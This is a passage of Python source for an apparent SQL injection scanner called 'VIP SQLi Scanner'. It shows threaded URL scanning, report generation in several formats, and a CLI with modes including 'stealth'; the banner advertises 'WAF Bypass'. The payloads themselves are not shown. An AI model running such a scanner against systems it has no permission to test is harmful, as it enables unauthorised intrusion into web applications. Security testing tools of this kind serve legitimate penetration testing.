                    self.stats.union_based += 1
            
            # Test boolean-based
            if not result and self.config.enable_boolean:
                payloads = self.payload_manager.get_payloads('boolean_based', limit=10)
                result = self.detection_engine.test_boolean_based(url, payloads)
                if result:
                    self.stats.boolean_based += 1
            
            # Run Plugins if no result yet
            if not result and self.plugin_manager:
                try:
                    plugin_results = self.plugin_manager.run_plugins(url, None)
                    for name, p_result in plugin_results.items():
                        if p_result.get('vulnerable'):
                            result = VulnerabilityResult(
                                url=url,
                                severity=VulnerabilityLevel.HIGH,
                                confidence=0.7,
                                vulnerability_type=f"Plugin: {name}",
                                affected_parameter="Multiple/Unknown",
                                payload_used="Plugin Specific",
                                evidence=str(p_result.get('details', '')),
                                remediation=self.detection_engine._get_remediation('error_based')
                            )
                            break
                except Exception as e:
                    console.print(f"[yellow]Warning: Plugin execution failed for {url}: {e}[/yellow]")

            # Optional ML Scoring for suspicious results or as a side-check
            if self.ml_detector:
                # Placeholder for ML feature extraction and scoring
                pass
            
            # Update statistics
            if result:
                self.stats.vulnerable_urls += 1
                if result.database_type:
                    self.stats.db_types[result.database_type] += 1
                if result.waf_detected:
                    self.stats.waf_detected_count += 1
                    self.stats.waf_types[result.waf_detected or "Unknown"] += 1
                
                # Cloud Sync if enabled
                if self.cloud_manager:
                    try:
                        self.cloud_manager.sync_finding(result.to_dict())
                    except Exception:
                        pass
            else:
                self.stats.safe_urls += 1
            
            self.stats.scanned_urls += 1
            
        except Exception as e:
            self.stats.error_count += 1
            console.print(f"[red]Error scanning {url}: {str(e)}[/red]")
        
        # Cache result
        self._cache[url_hash] = result
        
        return result
    
    def scan_urls(self, urls: List[str]) -> List[VulnerabilityResult]:
        """Scan multiple URLs with threading"""
        
        with Progress(
            SpinnerColumn(),
            TextColumn("[progress.description]{task.description}"),
            BarColumn(),
            TextColumn("[progress.percentage]{task.percentage:>3.0f}%"),
            TimeElapsedColumn(),
            TextColumn("• {task.fields[status]}"),
            console=console
        ) as progress:
            
            task = progress.add_task(
                "[cyan]Scanning URLs...",
                total=len(urls),
                status="Initializing..."
            )
            
            with ThreadPoolExecutor(max_workers=self.config.threads) as executor:
                future_to_url = {executor.submit(self.scan_url, url): url for url in urls}
                
                for future in as_completed(future_to_url):
                    url = future_to_url[future]
                    try:
                        result = future.result()
                        if result:
                            self.results.append(result)
                            progress.update(task, status=f"[red]VULN: {url[:50]}[/red]")
                        else:
                            progress.update(task, status=f"[green]SAFE: {url[:50]}[/green]")
                    except Exception as e:
                        console.print(f"[red]Error: {str(e)}[/red]")
                    
                    progress.advance(task)
        
        self.stats.end_time = time.time()
        return self.results

# =========================================================================
# REPORTING
# =========================================================================

class ReportGenerator:
    """Generate scan reports"""
    
    def __init__(self, statistics: ScanStatistics, results: List[VulnerabilityResult]):
        self.stats = statistics
        self.results = results
    
    def generate_console_report(self):
        """Generate console report"""
        
        # Statistics panel
        stats_table = Table(show_header=False, box=box.SIMPLE)
        stats_table.add_column(style="cyan")
        stats_table.add_column(style="white")
        
        stats_table.add_row("Total URLs", str(self.stats.total_urls))
        stats_table.add_row("Scanned", str(self.stats.scanned_urls))
        stats_table.add_row("Vulnerable", f"[red]{self.stats.vulnerable_urls}[/red]")
        stats_table.add_row("Safe", f"[green]{self.stats.safe_urls}[/green]")
        stats_table.add_row("Errors", f"[yellow]{self.stats.error_count}[/yellow]")
        stats_table.add_row("Excluded", str(self.stats.excluded_urls))
        stats_table.add_row("WAF Detected", str(self.stats.waf_detected_count))
        stats_table.add_row("Elapsed Time", f"{self.stats.elapsed_time():.2f}s")
        stats_table.add_row("Requests/sec", f"{self.stats.requests_per_second():.2f}")
        
        console.print()
        console.print(Panel(stats_table, title="[bold cyan]Scan Statistics[/bold cyan]", border_style="cyan"))
        
        # Detection breakdown
        if self.stats.vulnerable_urls > 0:
            detection_table = Table(title="Detection Breakdown", box=box.ROUNDED)
            detection_table.add_column("Type", style="cyan")
            detection_table.add_column("Count", justify="right")
            
            detection_table.add_row("Error-Based", str(self.stats.error_based))
            detection_table.add_row("Time-Based", str(self.stats.time_based))
            detection_table.add_row("Union-Based", str(self.stats.union_based))
            detection_table.add_row("Boolean-Based", str(self.stats.boolean_based))
            
            console.print()
            console.print(detection_table)
        
        # Database types
        if self.stats.db_types:
            console.print()
            console.print("[bold cyan]Database Types Detected:[/bold cyan]")
            for db_type, count in self.stats.db_types.items():
                console.print(f"  • {db_type}: {count}")
        
        # WAF types
        if self.stats.waf_types:
            console.print()
            console.print("[bold yellow]WAF Types Detected:[/bold yellow]")
            for waf_type, count in self.stats.waf_types.items():
                console.print(f"  • {waf_type}: {count}")
        
        # Vulnerabilities
        if self.results:
            console.print()
            vuln_table = Table(title="Vulnerabilities Found", box=box.DOUBLE_EDGE, show_lines=True)
            vuln_table.add_column("URL", style="cyan", no_wrap=False)
            vuln_table.add_column("Severity", justify="center")
            vuln_table.add_column("Type", style="magenta")
            vuln_table.add_column("Parameter", style="yellow")
            vuln_table.add_column("CVSS", justify="right")
            
            for result in self.results:
                severity_color = {
                    VulnerabilityLevel.CRITICAL: "bold red",
                    VulnerabilityLevel.HIGH: "red",
                    VulnerabilityLevel.MEDIUM: "yellow",
                    VulnerabilityLevel.LOW: "blue",
                }.get(result.severity, "white")
                
                vuln_table.add_row(
                    result.url[:80],
                    f"[{severity_color}]{result.severity.value}[/{severity_color}]",
                    result.vulnerability_type,
                    result.affected_parameter or "N/A",
                    f"{result.cvss_score:.1f}"
                )
            
            console.print(vuln_table)
    
    def generate_json_report(self, filepath: str):
        """Generate JSON report"""
        report = {
            'scan_info': {
                'version': VERSION,
                'timestamp': datetime.now().isoformat(),
                'elapsed_time': self.stats.elapsed_time(),
            },
            'statistics': {
                'total_urls': self.stats.total_urls,
                'scanned': self.stats.scanned_urls,
                'vulnerable': self.stats.vulnerable_urls,
                'safe': self.stats.safe_urls,
                'errors': self.stats.error_count,
                'excluded': self.stats.excluded_urls,
                'waf_detected': self.stats.waf_detected_count,
                'requests_per_second': self.stats.requests_per_second(),
                'detection_breakdown': {
                    'error_based': self.stats.error_based,
                    'time_based': self.stats.time_based,
                    'union_based': self.stats.union_based,
                    'boolean_based': self.stats.boolean_based,
                },
                'database_types': dict(self.stats.db_types),
                'waf_types': dict(self.stats.waf_types),
            },
            'vulnerabilities': [result.to_dict() for result in self.results]
        }
        
        with open(filepath, 'w') as f:
            json.dump(report, f, indent=2)
        
        console.print(f"[green]✓[/green] JSON report saved: {filepath}")
    
    def generate_csv_report(self, filepath: str):
        """Generate CSV report"""
        import csv
        
        with open(filepath, 'w', newline='', encoding='utf-8') as f:
            fieldnames = [
                'url', 'severity', 'confidence', 'vulnerability_type',
                'affected_parameter', 'payload_used', 'database_type',
                'waf_detected', 'cvss_score', 'timestamp'
            ]
            writer = csv.DictWriter(f, fieldnames=fieldnames)
            writer.writeheader()
            
            for result in self.results:
                writer.writerow({
                    'url': result.url,
                    'severity': result.severity.value,
                    'confidence': result.confidence,
                    'vulnerability_type': result.vulnerability_type,
                    'affected_parameter': result.affected_parameter or '',
                    'payload_used': result.payload_used or '',
                    'database_type': result.database_type or '',
                    'waf_detected': result.waf_detected or '',
                    'cvss_score': result.cvss_score,
                    'timestamp': result.timestamp,
                })
        
        console.print(f"[green]✓[/green] CSV report saved: {filepath}")
    
    def generate_html_report(self, filepath: str):
        """Generate HTML report"""
        html_template = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>VIP SQLi Scanner Report</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            padding: 20px;
            color: #333;
        }
        .container {
            max-width: 1200px;
            margin: 0 auto;
            background: white;
            border-radius: 10px;
            box-shadow: 0 10px 40px rgba(0,0,0,0.2);
            overflow: hidden;
        }
        .header {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            padding: 30px;
            text-align: center;
        }
        .header h1 { font-size: 2.5em; margin-bottom: 10px; }
        .header p { font-size: 1.1em; opacity: 0.9; }
        .stats {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 20px;
            padding: 30px;
            background: #f8f9fa;
        }
        .stat-card {
            background: white;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
            text-align: center;
        }
        .stat-card h3 {
            color: #667eea;
            font-size: 2em;
            margin-bottom: 5px;
        }
        .stat-card p {
            color: #666;
            text-transform: uppercase;
            font-size: 0.9em;
            letter-spacing: 1px;
        }
        .vulnerabilities {
            padding: 30px;
        }
        .vuln-card {
            background: white;
            border-left: 4px solid #dc3545;
            padding: 20px;
            margin-bottom: 20px;
            border-radius: 5px;
            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
        }
        .vuln-card.critical { border-color: #dc3545; }
        .vuln-card.high { border-color: #fd7e14; }
        .vuln-card.medium { border-color: #ffc107; }
        .vuln-card.low { border-color: #17a2b8; }
        .vuln-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 15px;
        }
        .vuln-url {
            font-weight: bold;
            color: #667eea;
            word-break: break-all;
        }
        .severity-badge {
            padding: 5px 15px;
            border-radius: 20px;
            color: white;
            font-weight: bold;
            font-size: 0.9em;
        }
        .severity-critical { background: #dc3545; }
        .severity-high { background: #fd7e14; }
        .severity-medium { background: #ffc107; }
        .severity-low { background: #17a2b8; }
        .vuln-details {
            display: grid;
            grid-template-columns: repeat(2, 1fr);
            gap: 10px;
            margin-top: 15px;
        }
        .detail-item {
            padding: 10px;
            background: #f8f9fa;
            border-radius: 5px;
        }
        .detail-label {
            font-weight: bold;
            color: #667eea;
            font-size: 0.9em;
            margin-bottom: 5px;
        }
        .detail-value {
            color: #333;
        }
        .footer {
            background: #2d3748;
            color: white;
            padding: 20px;
            text-align: center;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>🛡️ VIP SQLi Scanner Report</h1>
            <p>Generated: {{timestamp}}</p>
        </div>
        
        <div class="stats">
            <div class="stat-card">
                <h3>{{total_urls}}</h3>
                <p>Total URLs</p>
            </div>
            <div class="stat-card">
                <h3>{{scanned}}</h3>
                <p>Scanned</p>
            </div>
            <div class="stat-card">
                <h3 style="color: #dc3545;">{{vulnerable}}</h3>
                <p>Vulnerable</p>
            </div>
            <div class="stat-card">
                <h3 style="color: #28a745;">{{safe}}</h3>
                <p>Safe</p>
            </div>
        </div>
        
        <div class="vulnerabilities">
            <h2 style="margin-bottom: 20px; color: #667eea;">🔍 Vulnerabilities Found</h2>
            {{vulnerabilities_html}}
        </div>
        
        <div class="footer">
            <p>VIP SQLi Scanner v{{version}} • {{website}}</p>
        </div>
    </div>
</body>
</html>
"""
        
        # Generate vulnerabilities HTML
        vuln_html = ""
        for result in self.results:
            severity_class = result.severity.value.lower()
            
            vuln_html += f"""
            <div class="vuln-card {severity_class}">
                <div class="vuln-header">
                    <div class="vuln-url">{result.url}</div>
                    <div class="severity-badge severity-{severity_class}">{result.severity.value}</div>
                </div>
                <div class="vuln-details">
                    <div class="detail-item">
                        <div class="detail-label">Type</div>
                        <div class="detail-value">{result.vulnerability_type}</div>
                    </div>
                    <div class="detail-item">
                        <div class="detail-label">Parameter</div>
                        <div class="detail-value">{result.affected_parameter or 'N/A'}</div>
                    </div>
                    <div class="detail-item">
                        <div class="detail-label">Confidence</div>
                        <div class="detail-value">{result.confidence * 100:.1f}%</div>
                    </div>
                    <div class="detail-item">
                        <div class="detail-label">CVSS Score</div>
                        <div class="detail-value">{result.cvss_score}</div>
                    </div>
                    <div class="detail-item">
                        <div class="detail-label">Database</div>
                        <div class="detail-value">{result.database_type or 'Unknown'}</div>
                    </div>
                    <div class="detail-item">
                        <div class="detail-label">WAF</div>
                        <div class="detail-value">{result.waf_detected or 'None'}</div>
                    </div>
                </div>
            </div>
            """
        
        # Replace template variables
        html = html_template
        html = html.replace('{{timestamp}}', datetime.now().strftime('%Y-%m-%d %H:%M:%S'))
        html = html.replace('{{version}}', VERSION)
        html = html.replace('{{website}}', WEBSITE_URL)
        html = html.replace('{{total_urls}}', str(self.stats.total_urls))
        html = html.replace('{{scanned}}', str(self.stats.scanned_urls))
        html = html.replace('{{vulnerable}}', str(self.stats.vulnerable_urls))
        html = html.replace('{{safe}}', str(self.stats.safe_urls))
        html = html.replace('{{vulnerabilities_html}}', vuln_html or '<p>No vulnerabilities found.</p>')
        
        with open(filepath, 'w', encoding='utf-8') as f:
            f.write(html)
        
        console.print(f"[green]✓[/green] HTML report saved: {filepath}")

    def generate_sarif_report(self, filepath: str):
        """Generate SARIF report"""
        sarif = {
            "$schema": "https://raw.githubusercontent.com/oasis-tcs/sarif-spec/master/Schemata/sarif-schema-2.1.0.json",
            "version": "2.1.0",
            "runs": [
                {
                    "tool": {
                        "driver": {
                            "name": "VIP SQLi Scanner",
                            "version": VERSION,
                            "informationUri": GITHUB_URL,
                            "rules": [
                                {
                                    "id": "VIP-SQLI-001",
                                    "name": "SQL Injection",
                                    "shortDescription": {"text": "SQL Injection vulnerability detected"},
                                    "helpUri": "https://owasp.org/www-community/attacks/SQL_Injection"
                                }
                            ]
                        }
                    },
                    "results": [
                        {
                            "ruleId": "VIP-SQLI-001",
                            "level": "error",
                            "message": {"text": f"{v.vulnerability_type} detected in parameter '{v.affected_parameter}'"},
                            "locations": [{"physicalLocation": {"address": {"fullyQualifiedName": v.url}}}],
                            "properties": {
                                "severity": v.severity.value,
                                "confidence": f"{v.confidence * 100:.2f}%",
                                "payload": v.payload_used
                            }
                        } for v in self.results
                    ]
                }
            ]
        }
        with open(filepath, 'w', encoding='utf-8') as f:
            json.dump(sarif, f, indent=2)
        console.print(f"[green]✓[/green] SARIF report saved: {filepath}")

# =========================================================================
# BANNER & UI
# =========================================================================

def print_banner():
    """Display cyberpunk banner"""
    banner = Text()
    banner.append("╔═══════════════════════════════════════════════════════════╗\n", style="bold cyan")
    banner.append("║  ", style="bold cyan")
    banner.append("VIP SQLi SCANNER v3.0", style="bold magenta")
    banner.append("                                 ║\n", style="bold cyan")
    banner.append("║  ", style="bold cyan")
    banner.append("Professional SQL Injection Detection Suite", style="cyan")
    banner.append("            ║\n", style="bold cyan")
    banner.append("╠═══════════════════════════════════════════════════════════╣\n", style="bold cyan")
    banner.append("║  ", style="bold cyan")
    banner.append("🔍 Advanced Detection  🛡️ WAF Bypass  ⚡ High Speed", style="yellow")
    banner.append("      ║\n", style="bold cyan")
    banner.append("╚═══════════════════════════════════════════════════════════╝\n", style="bold cyan")
    banner.append(f"\n[dim]Website: {WEBSITE_URL} | GitHub: {GITHUB_URL}[/dim]\n")
    
    console.print(Panel(banner, border_style="magenta", padding=(1, 2)))

# =========================================================================
# MAIN
# =========================================================================

def main():
    """Main function"""
    print_banner()
    
    # Argument parser
    parser = argparse.ArgumentParser(
        description=f"VIP SQLi Scanner v{VERSION} - Advanced SQL Injection Detection",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  %(prog)s -u "http://example.com/page.php?id=1"
  %(prog)s -l urls.txt -m deep -t 20
  %(prog)s -l urls.txt --time-based --json report.json
  %(prog)s -u "http://example.com/page.php?id=1" --html report.html
        """
    )
    
    # Target options
    target_group = parser.add_mutually_exclusive_group(required=True)
    target_group.add_argument('-u', '--url', help='Single URL to scan')
    target_group.add_argument('-l', '--list', help='File containing list of URLs')
    
    # Scan options
    parser.add_argument('-m', '--mode', choices=['fast', 'balanced', 'deep', 'stealth'],
                       default='balanced', help='Scan mode (default: balanced)')
    parser.add_argument('-t', '--threads', type=int, default=10,
                       help='Number of threads (default: 10)')
    parser.add_argument('--timeout', type=int, default=15,
                       help='Request timeout in seconds (default: 15)')
    parser.add_argument('--time-based', action='store_true',
                       help='Enable time-based blind SQLi detection')
    parser.add_argument('--no-error', action='store_true',
                       help='Disable error-based detection')
    parser.add_argument('--no-union', action='store_true',
                       help='Disable UNION-based detection')
    parser.add_argument('--boolean', action='store_true',
                       help='Enable boolean-based detection')
    parser.add_argument('--ml', action='store_true',
                       help='Enable ML-based detection scoring')
    parser.add_argument('--no-plugins', action='store_true',
                       help='Disable plugin execution')
    parser.add_argument('--cloud-sync', action='store_true',
                       help='Enable cloud synchronization')
    parser.add_argument('-k', '--insecure', action='store_true',
                       help='Disable SSL certificate verification')
    
    # Payloads & exclusions
    parser.add_argument('-p', '--payloads', help='Custom payload file')
    parser.add_argument('-e', '--exclude', help='File with exclusion patterns')
    
    # Output options
    parser.add_argument('--json', help='Save JSON report')
    parser.add_argument('--csv', help='Save CSV report')
    parser.add_argument('--html', help='Save HTML report')
    parser.add_argument('--sarif', help='Save SARIF report')
    
    # Misc options
    parser.add_argument('--no-color', action='store_true', help='Disable colored output')
    parser.add_argument('-v', '--verbose', action='store_true', help='Verbose output')
    
    args = parser.parse_args()
    
    # Disable color if requested
    if args.no_color:
        console._color_system = None
    
    # Load URLs
    urls = []
    if args.url:
        urls = [args.url]
    elif args.list:
        try:
            with open(args.list, 'r', encoding='utf-8', errors='ignore') as f:
                urls = [line.strip() for line in f if line.strip()]
            console.print(f"[cyan]ℹ[/cyan] Loaded {len(urls)} URLs from {args.list}")
        except FileNotFoundError:
            console.print(f"[red]✗[/red] File not found: {args.list}")
            sys.exit(1)
    
    if not urls:
        console.print("[red]✗[/red] No URLs to scan")
        sys.exit(1)
    
    # Load exclusions
    exclusions = []
    if args.exclude:
        try:
            with open(args.exclude, 'r', encoding='utf-8', errors='ignore') as f:
                exclusions = [line.strip() for line in f if line.strip() and not line.startswith('#')]
            console.print(f"[cyan]ℹ[/cyan] Loaded {len(exclusions)} exclusion patterns")
        except FileNotFoundError:
            console.print(f"[yellow]⚠[/yellow] Exclusion file not found: {args.exclude}")
    
    # Initialize components
    scan_mode = ScanMode(args.mode)
    config = ScanConfiguration.from_mode(scan_mode)
    
    # Override config with CLI args
    if args.threads:
        config.threads = args.threads
    if args.timeout:
        config.timeout = args.timeout
    if args.time_based:
        config.enable_time_based = True
    if args.no_error:
        config.enable_error = False
    if args.no_union:
        config.enable_union = False
    if args.boolean:
        config.enable_boolean = True
    if args.ml:
        config.enable_ml = True
    if args.no_plugins:
        config.enable_plugins = False
    if args.cloud_sync:
        config.cloud_sync = True
    if args.insecure:
        config.verify_ssl = False
    
    payload_manager = PayloadManager(args.payloads)
    url_filter = URLFilter(exclusions)
    statistics = ScanStatistics(total_urls=len(urls))
    
    # Display configuration
    config_table = Table(show_header=False, box=box.SIMPLE)
    config_table.add_column(style="cyan")
    config_table.add_column(style="white")
    
    config_table.add_row("Scan Mode", config.mode.value.upper())
    config_table.add_row("Threads", str(config.threads))
    config_table.add_row("Timeout", f"{config.timeout}s")
    config_table.add_row("Payloads", str(payload_manager.total_payloads()))
    config_table.add_row("Error-Based", "✓" if config.enable_error else "✗")
    config_table.add_row("Time-Based", "✓" if config.enable_time_based else "✗")
    config_table.add_row("Union-Based", "✓" if config.enable_union else "✗")
    config_table.add_row("Boolean-Based", "✓" if config.enable_boolean else "✗")
    config_table.add_row("ML Scoring", "✓" if config.enable_ml else "✗")
    config_table.add_row("Plugins", "✓" if config.enable_plugins else "✗")
    config_table.add_row("Cloud Sync", "✓" if config.cloud_sync else "✗")
    
    console.print()
    console.print(Panel(config_table, title="[bold cyan]Configuration[/bold cyan]", border_style="cyan"))
    console.print()
    
    # Start scan
    scanner = SQLiScanner(config, payload_manager, url_filter, statistics)
    
    try:
        results = scanner.scan_urls(urls)
    except KeyboardInterrupt:
        console.print("\n[yellow]⚠[/yellow] Scan interrupted by user")
        sys.exit(0)
    
    # Generate reports
    report_gen = ReportGenerator(statistics, results)
    report_gen.generate_console_report()
    
    if args.json:
        report_gen.generate_json_report(args.json)
    
    if args.csv:
        report_gen.generate_csv_report(args.csv)
    
    if args.html:
        report_gen.generate_html_report(args.html)
    
    if args.sarif:
        report_gen.generate_sarif_report(args.sarif)
    
    # Summary
    console.print()
    if statistics.vulnerable_urls > 0:
        console.print(f"[bold red]⚠ Found {statistics.vulnerable_urls} vulnerable URLs![/bold red]")
    else:
        console.print(f"[bold green]✓ No vulnerabilities detected[/bold green]")
    
    console.print()

if __name__ == "__main__":
    main()